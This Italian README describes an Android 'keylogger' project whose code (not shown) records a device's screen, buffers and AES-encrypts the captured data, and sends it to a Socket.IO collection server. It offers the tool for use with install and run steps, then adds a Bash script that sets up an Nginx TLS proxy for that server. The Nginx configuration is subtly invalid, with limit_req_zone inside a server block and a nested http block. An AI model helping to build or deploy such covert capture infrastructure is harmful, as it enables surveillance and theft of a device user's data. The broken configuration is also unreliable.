# Android Keylogger with Automatic Reconnection and Encryption

Questo progetto implementa un keylogger per Android con funzionalità di riconnessione automatica, crittografia dei dati e notifiche. Utilizza `adbutils` per la registrazione dello schermo, `Socket.IO` per la gestione delle connessioni e `cryptography` per la crittografia dei dati.

## Requisiti

- Python 3.x
- adbutils
- socketio
- cryptography
- eventlet

## Installazione

1. Clona la repository:
    ```sh
    git clone https://github.com/GabrieleDattile/Android-Keylogger.git
    cd Android-Keylogger
    ```

2. Installa le dipendenze:
    ```sh
    pip install adbutils socketio cryptography eventlet
    ```

## File nella Repository

### keylogger.py

Questo file contiene la classe `Keylogger` per avviare e fermare la registrazione dello schermo del dispositivo Android, e inviare i dati raccolti al server.

### socket_handler.py

Questo file contiene il server Socket.IO che gestisce le richieste dal keylogger, decifra i dati ricevuti, esegue le azioni richieste e restituisce i risultati.

### encryption.py

Questo file gestisce la crittografia e la decrittografia dei dati utilizzando `cryptography`.

### authentication.py

Questo file gestisce la generazione delle chiavi di autenticazione e l'autenticazione degli utenti.

### notifications.py

Questo file contiene la classe `NotificationHandler` per inviare notifiche utilizzando Socket.IO.

## Utilizzo

### Avvio del Server

1. Avvia il server Socket.IO:
    ```sh
    python socket_handler.py
    ```

### Avvio del Keylogger

1. Avvia il keylogger:
    ```sh
    python keylogger.py
    ```

### Inviare Notifiche

1. Invia una notifica:
    ```sh
    python notifications.py
    ```

## Funzionalità

- **Riconnessione Automatica**: Utilizza `Socket.IO` per garantire che i dispositivi si riconnettano automaticamente una volta ripristinata la connessione.
- **Bufferizzazione dei Dati**: I dati raccolti vengono memorizzati temporaneamente quando la connessione viene persa e trasmessi una volta che la connessione è ristabilita.
- **Crittografia dei Dati**: I dati sono crittografati utilizzando l'algoritmo AES.
- **Autenticazione**: Implementa un sistema di autenticazione per garantire che solo utenti autorizzati possano accedere ai dati.
- **Notifiche**: Invia notifiche sullo stato della connessione e dei dati trasmessi.

# Script di Configurazione Nginx per Server Socket.IO

Questo script Bash guida l'utente attraverso la configurazione di Nginx per un server Socket.IO. Raccoglie le informazioni necessarie dall'utente e crea automaticamente il file di configurazione per Nginx. Inoltre, abilita la configurazione, testa la validità del file e ricarica Nginx se tutto è configurato correttamente.

## Requisiti

- Nginx installato sul server
- Certificati SSL validi (chiave e certificato)
- Permessi di superuser per eseguire il script

## Utilizzo

1. **Salva lo script**: Copia lo script Bash riportato sotto in un file chiamato `configure_nginx_socketio.sh`.

    ```bash
    #!/bin/bash

    # Richiedi informazioni all'utente
    read -p "Inserisci il tuo dominio (es: tuodominio.com): " DOMAIN
    read -p "Inserisci l'IP statico del server Socket.IO: " SOCKETIO_SERVER_IP
    read -p "Inserisci la porta del server Socket.IO: " SOCKETIO_SERVER_PORT
    read -p "Inserisci il percorso del certificato SSL (es: /etc/nginx/ssl/tuodominio.com.crt): " SSL_CERT_PATH
    read -p "Inserisci il percorso della chiave SSL (es: /etc/nginx/ssl/tuodominio.com.key): " SSL_KEY_PATH

    # Funzione per creare il file di configurazione Nginx
    create_nginx_config() {
        cat <<EOL > /etc/nginx/sites-available/socketio_nginx_config
    upstream socketio_servers {
        server $SOCKETIO_SERVER_IP:$SOCKETIO_SERVER_PORT;
        keepalive 64;
    }

    server {
        listen 80;
        server_name $DOMAIN;
        return 301 https://\$host\$request_uri;
    }

    server {
        listen 443 ssl;
        server_name $DOMAIN;

        # Configurazione del certificato SSL
        ssl_certificate $SSL_CERT_PATH;
        ssl_certificate_key $SSL_KEY_PATH;
        ssl_protocols TLSv1.2 TLSv1.3;
        ssl_prefer_server_ciphers on;
        ssl_ciphers 'EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH';

        # Headers di sicurezza
        add_header X-Frame-Options DENY;
        add_header X-Content-Type-Options nosniff;
        add_header X-XSS-Protection "1; mode=block";
        add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;

        location /socket.io {
            proxy_pass http://socketio_servers/socket.io;
            proxy_http_version 1.1;
            proxy_set_header Upgrade \$http_upgrade;
            proxy_set_header Connection "upgrade";
            proxy_set_header Host \$host;
            proxy_set_header X-Real-IP \$remote_addr;
            proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto \$scheme;

            # Rate limiting
            limit_req zone=one burst=5 nodelay;
        }

        # Definire la zona di limitazione delle richieste
        limit_req_zone \$binary_remote_addr zone=one:10m rate=1r/s;

        # Firewall IP basato su elenco
        allow 192.168.1.0/24;
        deny all;
    }

    # Firewall di base
    http {
        include /etc/nginx/mime.types;
        default_type application/octet-stream;

        # ...
        # Altre configurazioni

        server_tokens off;
    }
    EOL
    }

    # Funzione per abilitare la configurazione Nginx (solo per Debian/Ubuntu)
    enable_nginx_config() {
        ln -s /etc/nginx/sites-available/socketio_nginx_config /etc/nginx/sites-enabled/
    }

    # Funzione per testare la configurazione Nginx
    test_nginx_config() {
        nginx -t
    }

    # Funzione per ricaricare Nginx
    reload_nginx() {
        systemctl reload nginx
    }

    # Esegui i passaggi
    create_nginx_config
    enable_nginx_config
    if test_nginx_config; then
        reload_nginx
        echo "La configurazione Nginx è stata applicata con successo."
    else
        echo "Errore nella configurazione di Nginx. Controlla il file di configurazione."
    fi
    ```

2. **Rendi eseguibile lo script**:
    ```sh
    chmod +x configure_nginx_socketio.sh
    ```

3. **Esegui lo script con privilegi di superuser**:
    ```sh
    sudo ./configure_nginx_socketio.sh
    ```

4. **Inserisci i dettagli richiesti**: Durante l'esecuzione dello script, ti verrà chiesto di inserire:
    - Il tuo dominio (es: tuodominio.com)
    - L'IP statico del server Socket.IO
    - La porta del server Socket.IO
    - Il percorso del certificato SSL
    - Il percorso della chiave SSL
